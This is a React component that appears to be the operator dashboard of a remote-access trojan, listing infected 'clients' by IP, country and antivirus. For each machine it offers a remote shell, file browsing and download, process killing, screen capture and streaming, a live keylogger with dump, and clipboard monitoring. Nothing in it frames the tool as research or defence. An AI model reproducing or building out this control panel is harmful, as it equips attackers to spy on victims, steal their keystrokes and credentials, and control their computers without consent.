import { useState, useRef, useEffect } from "react";
import { hcApi } from "@/lib/hc-api";

type ControlTab = "info" | "shell" | "files" | "processes" | "screen" | "keylogger" | "clipboard";

const CONTROL_TABS: { id: ControlTab; label: string; icon: string }[] = [
  { id: "info", label: "System", icon: "💻" },
  { id: "shell", label: "Shell", icon: "⌨" },
  { id: "files", label: "Files", icon: "📁" },
  { id: "processes", label: "Processes", icon: "⚙" },
  { id: "screen", label: "Screen", icon: "🖥" },
  { id: "keylogger", label: "Keylogger", icon: "⌨" },
  { id: "clipboard", label: "Clipboard", icon: "📋" },
];

export function HCClients({ data }: { data: any }) {
  const [connected, setConnected] = useState<any>(null);
  const [search, setSearch] = useState("");
  const [ctrlTab, setCtrlTab] = useState<ControlTab>("info");
  const [shellInput, setShellInput] = useState("");
  const [shellHistory, setShellHistory] = useState<{ cmd: string; out: string }[]>([]);
  const [procSearch, setProcSearch] = useState("");
  const shellRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (connected?.commandHistory) {
      setShellHistory(connected.commandHistory.map((c: any) => ({ cmd: c.command, out: c.result })));
    }
  }, [connected]);

  if (!data) return <div className="hc-card">Loading…</div>;

  async function connectClient(id: string) {
    try {
      const detail = await hcApi.client(id);
      setConnected(detail);
      setCtrlTab("info");
      setShellHistory(detail.commandHistory?.map((c: any) => ({ cmd: c.command, out: c.result })) || []);
    } catch {}
  }

  async function runShell() {
    if (!shellInput.trim() || !connected) return;
    const cmd = shellInput.trim();
    setShellInput("");
    try {
      const res = await hcApi.sendCommand(connected.client.id, "shell", cmd);
      setShellHistory(prev => [...prev, { cmd, out: res.result }]);
      setTimeout(() => shellRef.current?.scrollTo(0, shellRef.current.scrollHeight), 50);
    } catch (e) {
      setShellHistory(prev => [...prev, { cmd, out: `Error: ${e instanceof Error ? e.message : "Failed"}` }]);
    }
  }

  if (connected) {
    const c = connected.client;
    return (
      <div>
        <button className="hc-back-btn" onClick={() => { setConnected(null); setShellHistory([]); }}>← Back to clients</button>
        <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 4 }}>
          <h1 style={{ margin: 0 }}>{c.name}</h1>
          <span className={`hc-badge ${c.status}`}>{c.status}</span>
        </div>
        <p className="hc-sub">{c.os} • {c.ip} • {c.country}</p>

        <div className="hc-ctrl-tabs">
          {CONTROL_TABS.map(t => (
            <button
              key={t.id}
              className={`hc-ctrl-tab ${ctrlTab === t.id ? "active" : ""}`}
              onClick={() => setCtrlTab(t.id)}
            >
              <span>{t.icon}</span> {t.label}
            </button>
          ))}
        </div>

        {ctrlTab === "info" && (
          <div className="hc-two-col">
            <div className="hc-card">
              <h3 className="hc-section-title">Hardware</h3>
              <div className="hc-info-row"><span>CPU</span><span>{c.cpu}</span></div>
              <div className="hc-info-row"><span>RAM</span><span>{c.ram}</span></div>
              <div className="hc-info-row"><span>GPU</span><span>{c.gpu}</span></div>
              <div className="hc-info-row"><span>Uptime</span><span>{c.uptime}</span></div>
            </div>
            <div className="hc-card">
              <h3 className="hc-section-title">Network & Security</h3>
              <div className="hc-info-row"><span>IP</span><span className="hc-mono">{c.ip}</span></div>
              <div className="hc-info-row"><span>Country</span><span>{c.country}</span></div>
              <div className="hc-info-row"><span>Speed</span><span>{c.netSpeed}</span></div>
              <div className="hc-info-row"><span>AV</span><span>{c.av}</span></div>
              <div className="hc-info-row"><span>Installed</span><span>{c.installed}</span></div>
            </div>
          </div>
        )}

        {ctrlTab === "shell" && (
          <div className="hc-card">
            <h3 className="hc-section-title">Remote Shell</h3>
            <div className="hc-shell-output" ref={shellRef}>
              {shellHistory.length === 0 && <div className="hc-muted">No commands yet. Type below to execute.</div>}
              {shellHistory.map((h, i) => (
                <div key={i} className="hc-shell-entry">
                  <div className="hc-shell-cmd">❯ {h.cmd}</div>
                  <pre className="hc-shell-result">{h.out}</pre>
                </div>
              ))}
            </div>
            <div className="hc-shell-input-row">
              <span className="hc-muted">❯</span>
              <input
                value={shellInput}
                onChange={e => setShellInput(e.target.value)}
                onKeyDown={e => e.key === "Enter" && runShell()}
                placeholder="Enter command…"
                className="hc-shell-input"
              />
              <button className="hc-connect-btn" onClick={runShell}>Run</button>
            </div>
          </div>
        )}

        {ctrlTab === "files" && (
          <div className="hc-card">
            <h3 className="hc-section-title">File Manager</h3>
            <div className="hc-muted" style={{ marginBottom: 8, fontSize: 11 }}>C:\Users\{c.user}\</div>
            {connected.files.map((f: any) => (
              <div key={f.name} className="hc-file-row">
                <span>{f.type === "folder" ? "📁" : "📄"} {f.name}</span>
                <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
                  <span className="hc-muted" style={{ fontSize: 11 }}>{f.modified}</span>
                  {f.type === "folder" && <button className="hc-mini-btn">Open</button>}
                  {f.type !== "folder" && <button className="hc-mini-btn">Download</button>}
                </div>
              </div>
            ))}
          </div>
        )}

        {ctrlTab === "processes" && (
          <div className="hc-card">
            <h3 className="hc-section-title">Process Manager</h3>
            <input
              className="hc-search"
              value={procSearch}
              onChange={e => setProcSearch(e.target.value)}
              placeholder="Search processes…"
              style={{ marginBottom: 8 }}
            />
            <table className="hc-table">
              <thead><tr><th>PID</th><th>Name</th><th>CPU</th><th>Memory</th><th>Status</th><th></th></tr></thead>
              <tbody>
                {connected.processes
                  .filter((p: any) => p.name.toLowerCase().includes(procSearch.toLowerCase()))
                  .map((p: any) => (
                  <tr key={p.pid}>
                    <td className="hc-mono">{p.pid}</td>
                    <td>{p.name}</td>
                    <td>{p.cpu}</td>
                    <td>{p.mem}</td>
                    <td><span className={`hc-badge ${p.status === "running" ? "online" : "idle"}`}>{p.status}</span></td>
                    <td>
                      <button className="hc-mini-btn hc-danger-btn">Kill</button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {ctrlTab === "screen" && (
          <div className="hc-card">
            <h3 className="hc-section-title">Screen Capture</h3>
            <div className="hc-screen-placeholder">
              <div className="hc-muted">📡 Waiting for screen data from agent…</div>
              <div className="hc-muted" style={{ fontSize: 11, marginTop: 4 }}>Screen capture will appear here when the agent sends a frame.</div>
            </div>
            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "screenshot")}>📸 Capture</button>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "stream_start")}>▶ Start Stream</button>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "stream_stop")}>⏹ Stop</button>
            </div>
          </div>
        )}

        {ctrlTab === "keylogger" && (
          <div className="hc-card">
            <h3 className="hc-section-title">Keylogger <span className="hc-rec-badge">● LIVE</span></h3>
            <div className="hc-keylog-output">
              <div className="hc-muted">Keylog stream will appear here when the agent reports keystrokes.</div>
            </div>
            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "keylog_start")}>▶ Start</button>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "keylog_stop")}>⏹ Stop</button>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "keylog_dump")}>📥 Dump</button>
            </div>
          </div>
        )}

        {ctrlTab === "clipboard" && (
          <div className="hc-card">
            <h3 className="hc-section-title">Clipboard Monitor</h3>
            <div className="hc-keylog-output">
              <div className="hc-muted">Clipboard contents will appear here when captured by the agent.</div>
            </div>
            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "clipboard_get")}>📋 Get Current</button>
              <button className="hc-connect-btn" onClick={() => hcApi.sendCommand(c.id, "clipboard_monitor")}>👁 Monitor</button>
            </div>
          </div>
        )}
      </div>
    );
  }

  const filtered = data.clients.filter((c: any) =>
    c.name.toLowerCase().includes(search.toLowerCase()) ||
    c.id.toLowerCase().includes(search.toLowerCase()) ||
    c.ip.includes(search)
  );

  return (
    <div>
      <h1>Clients</h1>
      <p className="hc-sub">{data.clients.length} connected clients.</p>
      <input className="hc-search" value={search} onChange={e => setSearch(e.target.value)} placeholder="Search clients…" />
      <div className="hc-card">
        <table className="hc-table">
          <thead>
            <tr><th>ID</th><th>Name</th><th>OS</th><th>IP</th><th>Country</th><th>Status</th><th></th></tr>
          </thead>
          <tbody>
            {filtered.map((c: any) => (
              <tr key={c.id}>
                <td className="hc-mono">{c.id}</td>
                <td>{c.name}</td>
                <td>{c.os}</td>
                <td className="hc-mono">{c.ip}</td>
                <td>{c.country}</td>
                <td><span className={`hc-badge ${c.status}`}>{c.status}</span></td>
                <td>
                  <button className="hc-connect-btn" onClick={() => connectClient(c.id)}>Connect</button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
